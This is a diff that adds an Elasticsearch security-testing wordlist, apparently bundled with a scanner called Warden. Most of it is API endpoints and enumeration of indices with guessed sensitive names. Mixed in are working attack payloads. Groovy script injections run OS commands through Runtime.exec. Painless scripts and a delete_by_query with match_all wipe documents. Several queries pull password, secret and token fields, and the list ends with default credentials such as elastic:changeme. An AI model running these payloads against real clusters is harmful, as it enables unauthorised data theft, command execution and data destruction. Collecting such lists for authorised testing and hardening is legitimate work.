@@ -1,0 +1,675 @@
+# Elasticsearch Security Testing Wordlist
+# Embedded in Warden v0.8.0 Enterprise Edition
+# Port: 9200 (HTTP), 9300 (Cluster)
+
+# === Information Disclosure - _cat API ===
+
+/_cat
+/_cat?v
+/_cat/indices
+/_cat/indices?v
+/_cat/indices?bytes=b
+/_cat/indices?h=index,docs.count,store.size
+/_cat/aliases
+/_cat/aliases?v
+/_cat/nodes
+/_cat/nodes?v
+/_cat/nodes&h=name,ip,role
+/_cat/shards
+/_cat/shards?v
+/_cat/shards&index=*
+/_cat/thread_pool
+/_cat/thread_pool?v
+/_cat/count
+/_cat/count?v
+/_cat/segments
+/_cat/segments?v
+/_cat/health
+/_cat/health?v
+/_cat/pending_tasks
+/_cat/pending_tasks?v
+/_cat/plugins
+/_cat/plugins?v
+/_cat/fielddata
+/_cat/fielddata?v
+/_cat/nodeattrs
+/_cat/nodeattrs?v
+/_cat/recovery
+/_cat/recovery?v
+/_cat/allocation
+/_cat/allocation?v
+
+# === Information Disclosure - Cluster APIs ===
+
+/_cluster/health
+/_cluster/health?pretty
+/_cluster/health?wait_for_status=green
+/_cluster/state
+/_cluster/state?pretty
+/_cluster/state/_all
+/_cluster/state/metadata
+/_cluster/state/routing_table
+/_cluster/state/blocks
+/_cluster/stats
+/_cluster/stats?human
+/_cluster/stats?pretty
+/_cluster/settings
+/_cluster/settings?flat_settings=true
+/_cluster/settings?include_defaults=true
+
+# === Information Disclosure - Node APIs ===
+
+/_nodes
+/_nodes?pretty
+/_nodes/_local
+/_nodes/_local/stats
+/_nodes/stats
+/_nodes/stats/all
+/_nodes/stats/indices
+/_nodes/stats/os
+/_nodes/stats/jvm
+/_nodes/stats/process
+/_nodes/network
+/_nodes/info
+/_nodes/plugins
+
+# === Information Disclosure - Index/Mapping/Settings ===
+
+/_mapping
+/_mapping?pretty
+/_mapping/*
+/_mapping/_field_caps
+/_mapping/_all
+/_all
+/_all/_mapping
+/_all/_settings
+/_settings
+/_settings?pretty
+/_settings?flat_settings=true
+/_aliases
+/_aliases?pretty
+
+# === Index Enumeration ===
+
+users
+users/_count
+users/_search
+users/_mapping
+users/_settings
+admin
+admin/_count
+admin/_search
+logs
+logs/_count
+logs/_search
+auth
+auth/_count
+secrets
+secrets/_count
+passwords
+passwords/_count
+accounts
+accounts/_count
+credentials
+credentials/_count
+tokens
+tokens/_count
+api_keys
+api_keys/_count
+sessions
+sessions/_count
+customers
+customers/_count
+orders
+orders/_count
+products
+products/_count
+documents
+documents/_count
+config
+config/_count
+configuration
+configuration/_count
+.kibana
+.kibana/_count
+.logstash
+.monitoring
+.security
+
+# === Document Access ===
+
+/users/_search?size=100
+/users/_search?size=1000
+/users/_search?q=*
+/users/_search?q=*:*
+/users/_search?pretty
+/admin/_search?size=100
+/admin/_search?q=*
+/logs/_search?size=1000
+/secrets/_search
+/passwords/_search
+/tokens/_search
+/accounts/_search?pretty
+/_all/_search?size=10
+/_all/_search?q=*:*
+
+# === Document ID Enumeration ===
+
+/users/1
+/users/2
+/users/admin
+/users/root
+/admin/1
+/admin/admin
+/secrets/1
+/passwords/1
+/accounts/1
+/tokens/1
+/config/1
+/_doc/1
+/_doc/admin
+
+# === Query Injection - NoSQL ===
+
+{"query":{"match_all":{}}}
+{"query":{"match_all":{}},"size":1000}
+{"query":{"wildcard":{"_id":"*"}}}
+{"query":{"wildcard":{"password":"*"}}}
+{"query":{"wildcard":{"email":"*@*"}}}
+{"query":{"prefix":{"email":"admin"}}}
+{"query":{"regexp":{"_id":".*"}}}
+{"query":{"range":{"_id":{"gte":0}}}}
+{"query":{"range":{"_id":{"lte":999999}}}}
+{"query":{"bool":{"must":[{"match":{"_id":"1 OR 1=1"}}]}}}
+{"query":{"bool":{"should":[{"match_all":{}}]}}}
+{"query":{"constant_score":{"filter":{"term":{"_id":"*"}}}}}
+{"query":{"terms":{"_id":["1","2","3","admin"]}}}
+{"query":{"fuzzy":{"_id":"1"}}}
+{"query":{"more_like_this":{"fields":["_all"],"like_text":""}}}
+
+# === Script Injection - Painless ===
+
+{"query":{"script_score":{"query":{"match_all":{}},"script":{"source":"1==1","lang":"painless"}}}}
+{"query":{"script_fields":{"test":{"script":{"source":"doc['_id'].value","lang":"painless"}}}}}
+{"script":{"source":"ctx._source.password","lang":"painless"}}
+{"script":{"source":"doc[params.field].value","params":{"field":"password"},"lang":"painless"}}
+{"script":{"source":"ctx._source.put('secret','leaked')","lang":"painless"}}
+{"script":{"source":"ctx._source.delete()","lang":"painless"}}
+{"script":{"source":"ctx.op='delete'","lang":"painless"}}
+{"query":{"function_score":{"query":{"match_all":{}},"boost":"1","script_score":{"script":{"id":"test","params":{"param":1}}}}}}
+
+# === Script Injection - Groovy (RCE) ===
+
+{"query":{"script_score":{"query":{"match_all":{}},"script":{"source":"1==1","lang":"groovy"}}}}
+{"script":{"inline":"new org.mozilla.javascript.Context()","lang":"groovy"}}
+{"script":{"inline":"Runtime.getRuntime().exec('whoami')","lang":"groovy"}}
+{"script":{"inline":"java.lang.Runtime.getRuntime()","lang":"groovy"}}
+{"script":{"inline":"def proc = \"ls\".execute(); proc.text","lang":"groovy"}}
+{"script":{"source":"Class.forName('java.lang.Runtime')","lang":"groovy"}}
+{"query":{"custom_filters_score":{"query":{"match_all":{}},"filters":[{"filter":{"match_all":{}},"script":"1==1"}]}}}
+
+# === Script Injection - Expression ===
+
+{"script":{"inline":"1+1","lang":"expression"}}
+{"script":{"inline":"doc['_id'].value","lang":"expression"}}
+{"script":{"inline":"doc['password'].value","lang":"expression"}}
+
+# === Template Injection - Mustache ===
+
+{"query":{"template":{"inline":{"query":{"match":{"{{field}}":"{{value}}"}}}}}}
+{"query":{"template":{"inline":{"query":{"range":{"_id":{"{{exp}}":"1"}}}}}}}
+{"query":{"template":{"inline":{"size":"{{size}}","query":{"match_all":{}}}}}}
+{"query":{"template":{"file":"test_template","params":{"field":"password"}}}}
+
+# === Snapshot/Restore - Data Exfiltration ===
+
+/_snapshot
+/_snapshot?pretty
+/_snapshot/_all
+/_snapshot/_all?pretty
+/_restore
+/_restore?pretty
+/_restore/_all
+/_snapshot/backup
+/_snapshot/backup/*/
+/_snapshot/backup/_status
+
+# === Search Templates ===
+
+/_search/template
+/_search/template?pretty
+/_scripts
+/_scripts?pretty
+/_scripts/painless
+/_scripts/groovy
+
+# === Tasks and Monitoring ===
+
+/_tasks
+/_tasks?detailed=true
+/_tasks?actions=*search*
+/_tasks?actions=*delete*
+/_tasks?pretty
+/_cancel/tasks
+/_cancel/tasks?actions=*search*
+
+# === Update/Bulk Operations ===
+
+/_bulk
+/_update
+/users/_update/1
+/_update/byquery
+/_delete_by_query
+
+# === Aggregation Queries ===
+
+{"query":{"match_all":{}},"aggs":{"all_ids":{"terms":{"field":"_id","size":1000}}}}
+{"query":{"match_all":{}},"aggs":{"unique_emails":{"terms":{"field":"email","size":1000}}}}
+{"query":{"match_all":{}},"aggs":{"passwords":{"terms":{"field":"password","size":1000}}}}
+{"aggs":{"indices":{"terms":{"field":"_index","size":100}}}}
+
+# === Field Caps - Schema Discovery ===
+
+/_field_caps
+/_field_caps?fields=*
+/_field_caps?fields=password,email,username
+/users/_field_caps
+
+# === Rollup Jobs ===
+
+/_rollup
+/_rollup/job
+/_rollup/data
+
+# === Transform Jobs ===
+
+/_transform
+/_transform/_all
+/_transform/_stats
+
+# === Data Streams ===
+
+/_data_stream
+/_data_stream/*
+/_data_stream/_all
+
+# === Index Lifecycle Management ===
+
+/_ilm/status
+/_ilm/policy
+/_ilm/policy/*
+
+# === Machine Learning ===
+
+/_ml
+/_ml/anomaly_detectors
+/_ml/datafeeds
+/_ml/jobs
+
+# === Security (X-Pack) ===
+
+/_security/user
+/_security/role
+/_security/privilege
+/_xpack/security/user
+/_xpack/security/role
+
+# === Watcher (Alerting) ===
+
+/_watcher
+/_watcher/stats
+/_watcher/watches
+/_watcher/watches/_all
+
+# === Cross-Cluster Replication ===
+
+/_ccr
+/_ccr/stats
+/_ccr/info
+
+# === Index Management ===
+
+/users/_settings
+/users/_mapping
+/_all/_settings
+/_all/_mapping
+/_refresh
+/_flush
+/_forcemerge
+
+# === Sorting/Pagination Bypass ===
+
+{"query":{"match_all":{}},"size":10000,"from":0}
+{"query":{"match_all":{}},"size":9999,"sort":[{"_id":"asc"}]}
+{"query":{"match_all":{}},"from":0,"size":10000,"sort":["_doc"]}
+
+# === Source Filtering ===
+
+{"query":{"match_all":{}},"_source":["password","secret","token"]}
+{"query":{"match_all":{}},"_source":false}
+{"query":{"match_all":{}},"_source":{"includes":["*"]}}
+
+# === Scripted Fields ===
+
+{"query":{"match_all":{}},"script_fields":{"password":{"script":{"source":"doc['password'].value","lang":"painless"}}}}
+{"query":{"match_all":{}},"script_fields":{"secret":{"script":{"source":"doc['_source'].get('secret')","lang":"painless"}}}}
+
+# === Explain API - Performance Analysis ===
+
+/_explain
+/users/_explain/1
+/admin/_explain/admin
+
+# === Count API ===
+
+/_count
+/users/_count
+/_all/_count
+
+# === Exists Queries ===
+
+{"query":{"exists":{"field":"password"}}}
+{"query":{"exists":{"field":"secret"}}}
+{"query":{"exists":{"field":"api_key"}}}
+
+# === Missing Queries (deprecated) ===
+
+{"query":{"missing":{"field":"password"}}}
+
+# === Multi-match ===
+
+{"query":{"multi_match":{"query":"admin","fields":["*"]}}}
+{"query":{"multi_match":{"query":"*","fields":["password","secret"]}}}
+
+# === Query String ===
+
+{"query":{"query_string":{"query":"*"}}}
+{"query":{"query_string":{"query":"_id:*"}}}
+{"query":{"query_string":{"query":"password:*"}}}
+
+# === Simple Query String ===
+
+{"query":{"simple_query_string":{"query":"*","fields":["*"]}}}
+
+# === Geo Queries ===
+
+{"query":{"match_all":{}},"filter":{"geo_bounding_box":{"location":{"top_left":{"lat":90,"lon":-180},"bottom_right":{"lat":-90,"lon":180}}}}}
+
+# === Nested/Has Child ===
+
+{"query":{"nested":{"path":"*","query":{"match_all":{}}}}}
+{"query":{"has_child":{"type":"*","query":{"match_all":{}}}}}
+
+# === Percolate Queries ===
+
+{"query":{"percolate":{}}}
+
+# === Common Terms ===
+
+{"query":{"common":{"_all":{"query":"*","cutoff_frequency":0.001}}}}
+
+# === Function Score ===
+
+{"query":{"function_score":{"query":{"match_all":{}}}}}
+
+# === Boosting ===
+
+{"query":{"boosting":{"positive":{"match_all":{}},"negative":{}}}}
+
+# === Constant Score ===
+
+{"query":{"constant_score":{"filter":{"match_all":{}}}}}
+
+# === Indices Aliases ===
+
+/_alias
+/_alias/*
+/users/_alias
+/users/_alias/*
+
+# === Settings Manipulation ===
+
+{"index":{"number_of_replicas":0}}
+{"settings":{"index":{"blocks":{"read_only_allow_delete":false}}}}
+
+# === Index Templates ===
+
+/_template
+/_template/*
+/_template/template_1
+
+# === Component Templates ===
+
+/_component_template
+/_component_template/*
+
+# === Index Patterns ===
+
+/_index_template
+/_index_template/*
+
+# === Cluster Reroute ===
+
+/_cluster/reroute
+
+# === Pending Cluster Tasks ===
+
+/_cluster/pending_tasks
+
+# === Cluster State Metadata ===
+
+/_cluster/state/metadata
+/_cluster/state/routing_table
+/_cluster/state/blocks
+/_cluster/state/version
+
+# === Nodes Info ===
+
+/_nodes/nodeId
+/_nodes/nodeId/stats
+/_nodes/nodeId/info
+
+# === Node Usage ===
+
+/_nodes/usage
+
+# === Nodes Hot Threads ===
+
+/_nodes/hot_threads
+
+# === Pending Cluster Tasks ===
+
+/_cluster/pending_tasks
+
+# === Split Brain Detection ===
+
+/_cluster/state
+
+# === Shards ===
+
+/_cat/shards
+/_cat/shards?v
+/_shards
+
+# === Recovery ===
+
+/_cat/recovery
+/_cat/recovery?v
+/_recovery
+
+# === File Allocation ===
+
+/_cluster/reroute?retry_failed=true
+
+# === Clear Cache ===
+
+/_cache/clear
+
+# === Refresh ===
+
+/_refresh
+
+# === Flush ===
+
+/_flush
+
+# === Force Merge ===
+
+/_forcemerge
+
+# === Upgrade ===
+
+/_upgrade
+/_upgrade?pretty
+
+# === Validate Queries ===
+
+/_validate/query
+/_validate/query?explain
+/_validate/query?rewrite
+
+# === Search Shards ===
+
+/_search_shards
+/_search_shards?index=*
+
+# === Field Stats ===
+
+/_field_stats
+
+# === Fielddata ===
+
+/_nodes/stats/indices/fielddata
+/_cat/fielddata
+
+# === Index Stats ===
+
+/_stats
+/_stats?human
+/users/_stats
+
+# === Index Segments ===
+
+/_segments
+/users/_segments
+
+# === Store ===
+
+/_store
+
+# === Warmer ===
+
+/_warmer
+
+# === Analyze ===
+
+/_analyze
+/_analyze?text=test
+/_analyze?analyzer=standard&text=test
+
+# === Term Vectors ===
+
+/_termvectors
+/_termvectors/users/1
+/_mtermvectors
+
+# === Bulk ===
+
+/_bulk
+{"index":{"_index":"test"}}
+{"delete":{"_index":"test","_id":"1"}}
+{"update":{"_index":"test","_id":"1"}}
+{"create":{"_index":"test","_id":"1"}}
+
+# === Delete By Query ===
+
+/_delete_by_query
+{"query":{"match_all":{}}}
+
+# === Update By Query ===
+
+/_update_by_query
+{"script":{"source":"ctx._source.delete()","lang":"painless"}}
+
+# === Reindex ===
+
+/_reindex
+{"source":{"index":"users"},"dest":{"index":"backup"}}
+
+# === Msearch ===
+
+/_msearch
+{"index":"users"}
+{"query":{"match_all":{}}}
+{"index":"admin"}
+{"query":{"match_all":{}}}
+
+# === Search Template Execution ===
+
+/_render/template
+{"inline":{"query":{"match":{"{{field}}":"{{value}}"}}}}}
+
+# === SQL (X-Pack) ===
+
+/_sql
+{"query":"SELECT * FROM users"}
+/_sql?format=json
+/_sql?format=txt
+/_sql?format=csv
+
+# === EQL (Event Query Language) ===
+
+/_eql/search
+{"query":"process where process_name == \"cmd.exe\""}
+
+# === KQL (Kibana Query Language) ===
+
+/_kql/search
+{"query":"*"}
+
+# === Async Search ===
+
+/_async_search
+/_async_search/stats
+
+# === Point in Time ===
+
+/_pit
+/users/_pit?keep_alive=1m
+
+# === Scroll ===
+
+/_search/scroll
+{"scroll":"1m","scroll_id":"test"}
+/_search/scroll/scroll_id
+
+# === Multi-Search Template ===
+
+/_search/template/multi
+
+# === Rank Evaluation ===
+
+/_rank_eval
+{"requests":[{"query":{"match_all":{}},"rating":[]}]}
+
+# === Graph Explore ===
+
+/_graph/explore
+
+# === Data Frame Analytics ===
+
+/_ml/data_frame/analytics
+
+# --- Common Default Credentials ---
+
+# Try HTTP Basic Auth with common credentials
+# elastic:changeme (default)
+# admin:admin
+# elastic:elastic
+# root:root
+# kibana:kibana
+
+# --- Default SSL Certificates ---
+
+# Some ES instances use self-signed certs
+# Try SSL verification bypass
